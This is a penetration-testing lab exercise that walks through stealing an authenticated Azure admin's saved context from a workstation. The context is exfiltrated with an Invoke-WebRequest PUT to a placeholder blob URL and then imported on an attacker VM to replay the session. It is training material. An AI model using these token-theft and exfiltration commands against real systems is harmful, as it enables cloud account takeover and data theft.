


## Hands-on exercise â€“ stealing and reusing tokens from an authenticated Azure admin system
In this exercise, we will be exporting cached tokens from the system of an authenticated Azure admin user and reusing those tokens on our pentest VM. Here are the tasks that we will complete in this exercise:

### Task 1 - Review the information for this exercise

1. On your pentest VM, browse to the following path **`C:\Users\pentestadmin\Desktop\ExerciseFiles\Modules\03`** and open the file named **`admin-token-theft-info.txt`** for later reference. There are six values that you will find in the file:
   * **Azure Admin User - Username**: This is the Azure administrator username whose token will be stolen from a workstation.
   * **Azure Admin User - Password**: This is the password of the Azure administrator user whose credential will be stolen.
   * **VM Public IP**: The public IP of the Admin workstation VM that the token will be stolen from.
   * **VM Admin Username**: The local user that you will use to authenticate to the workstation.
   * **VM Admin User Password**: The password of the local user that you will use to authenticate to the workstation.
   * **Exfiltration Storage Location**: The blob container that you will exfiltrate the stolen credential to and download it from for reuse from your pentest VM.

### Task 2 - Connect to the victim's PC and exfiltrate the token (Windows)
1. Open an RDP client on your PC and connect to the **`VM Public IP`** listed in your exercise file. When prompted to authenticate, use the **`VM Admin Username`** value as the username and the **`VM Admin User Password`** value as the password.

2. Within the RDP session to VM, open a PowerShell console and authenticate to Azure as the victim admin using the following commands:
   * Replace the placeholders for **`AZURE_ADMIN_USER_PASSWORD`** and **`AZURE_ADMIN_USER_USERNAME`** with the actual values from your exercise file.
```
$SecurePassword = ConvertTo-SecureString "AZURE_ADMIN_USER_PASSWORD" -AsPlainText -Force

$Credential = New-Object System.Management.Automation.PSCredential ("AZURE_ADMIN_USER_USERNAME>", $SecurePassword)

Connect-AzAccount -Credential $Credential
```

3. Verify authentication using the following command:
* The command lists all the resource groups in the victim's Azure environment. If you get an error, verify that you have the correct username and password.
```
Get-AzResourceGroup
```

4. At this point, we can act as an attacker with an active session on the system and save the current context for exfiltration to another system for reuse.

5. Save the current authentication context and verify that the context has been saved using the following commands:
```
Save-AzContext -Path azureprofile.json
Get-ChildItem azureprofile.json
```

6. Compress the saved authentication context and verify using the following commands:
```
7z a azureprofile.zip azureprofile.json
Get-ChildItem azureprofile.zip
```

7. Exfiltrate the compressed authentication context to the blob container listed in your exercise file, using the following command. Replace the placeholder with the value of Exfiltration Storage Location. Ensure that there are no line breaks before pasting this. You should get an HTTP 201 response:
```
Invoke-WebRequest -Method 'PUT' -Uri 'TOKEN_EXFILTRATION_STORAGE_LOCATION' -InFile 'azureprofile.zip' -Headers @{"x-ms-blob-type"="BlockBlob"} -UseBasicParsing
```

### Task 3 - Reuse the stolen token from your pentest VM
* In this task, we will used the exfiltrated context to gain access as the user in another environment

1. Switch back to your pentest VM, open a PowerShell console. 

2. Verify that you currently do not have a connection to the victim's Azure environment by using the following commands. You should get an error message. The first command **`Disconnect-AzAccount`** logs you out of your own Azure environment if you have authenticated previously.
```
Disconnect-AzAccount 

Get-AzResourceGroup
```

3. Download and verify the exfiltrated context file using the following command. Replace the placeholder with the value of Exfiltration Storage Location that you copied from the script's output:
```
Invoke-WebRequest -Uri "TOKEN_EXFILTRATION_STORAGE_LOCATION" -OutFile azureprofile.zip

Get-ChildItem azureprofile.zip
```
    
4. Extract the downloaded file using the following command and verify the extracted file:
```
7z e azureprofile.zip
Get-ChildItem -Filter azureprofile.*
```

5. Restore the authentication context to your pentest VM using the following command:
```
Import-AzContext -Path .\azureprofile.json
```

6. Verify that the context has successfully been applied to your pentest VM by running commands with the stolen admin authentication context. At this point, you have validated that an authentication context can be stolen from an administrator's system, exported, and reused from an attacker's system:
```
Get-AzResourceGroup
```

